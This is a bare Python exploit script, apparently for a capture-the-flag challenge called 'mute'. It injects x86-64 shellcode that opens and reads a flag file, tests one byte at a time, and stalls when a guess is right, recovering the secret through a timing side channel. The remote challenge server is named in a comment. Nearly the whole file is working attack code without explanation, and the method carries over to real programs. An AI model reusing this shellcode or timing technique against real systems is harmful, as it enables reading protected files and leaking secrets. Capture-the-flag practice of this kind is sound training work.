from pwn import *
import string
from datetime import datetime
import os

context.log_level = 'error'

shell = "\\x49\\xb8\\x74\\x65\\x2f\\x66\\x6c\\x61\\x67\\x00\\x41\\x50\\x49\\xb8\\x2f\\x68\\x6f\\x6d\\x65\\x2f\\x6d\\x75\\x41\\x50\\x48\\x89\\xe7\\x48\\x31\\xc0\\x04\\x02\\x48\\x31\\xf6\\x0f\\x05\\x66\\x81\\xec\\xff\\x0f\\x48\\x8d\\x34\\x24\\x48\\x89\\xc7\\x48\\x31\\xd2\\x66\\xba\\xff\\x0f\\x48\\x31\\xc0\\x0f\\x05\\x80\\x7e\\x01\\x68\\x75\\x18\\xb9\\x00\\x00\\x00\\x00\\xff\\xc1\\x83\\xf9\\xff\\x75\\xf9\\xb9\\x00\\x00\\x00\\x00\\xff\\xc1\\x83\\xf9\\xff\\x75\\xf9\\x48\\x31\\xc0\\x04\\x3c\\x0f\\x05"

flag = ""
i = 1

while True:
    for c in string.printable:
        try:
            current_shell = shell.replace("\\x01\\x68", "\\x" + chr(i).encode("hex") + "\\x" + c.encode("hex"))
            start = datetime.now()
            os.popen("python -c 'print(\"" + current_shell + "\" + \"\\x00\"*4009)' | ./mute") # nc mute_9c1e11b344369be9b6ae0caeec20feb8.quals.shallweplayaga.me 443
            total = (datetime.now() - start).seconds
            if total >= 1:
                i += 1
                flag += c
                print("FOUND!!!!!")
                print(flag)
        except:
            pass
    
